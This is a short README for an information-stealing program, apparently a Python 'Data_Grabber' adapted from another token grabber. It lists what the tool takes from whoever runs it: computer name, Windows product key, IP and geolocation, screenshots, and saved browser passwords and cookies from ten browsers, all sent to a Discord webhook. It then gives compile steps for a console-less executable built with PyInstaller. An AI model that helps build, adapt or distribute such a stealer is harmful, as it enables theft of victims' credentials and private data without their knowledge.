# Welcome to this shitty repository!
Stole code from [Rdimo](https://github.com/Rdimo/Hazard-Token-Grabber-V2) and added my own features.
## When you execute it, you will get to discord:
- Computer Name
- Windows Product Key & Build Info
- IP & Geolocation. (Country, City, Google Maps Location)
- A screenshot of all their monitors
- All Passwords and Cookies from browsers (checks all profiles) in .csv format, that named bellow

| Supported browsers  |
| ------------- |
| Opera |
| Opera GX |
| Vivaldi |
| Chrome |
| Microsoft Edge |
| Uran |
| Yandex |
| Brave |
| Iridium |
| Firefox |

## Compile
1. Before doing everything, replace text 'WEBHOOK_HERE' (line 33) with your discord webhook.
2. Install modules if needed.
3. On the same directory as python file open command prompt and type:
>pyinstaller --clean --onefile --noconsole -i NONE Data_Grabber.py
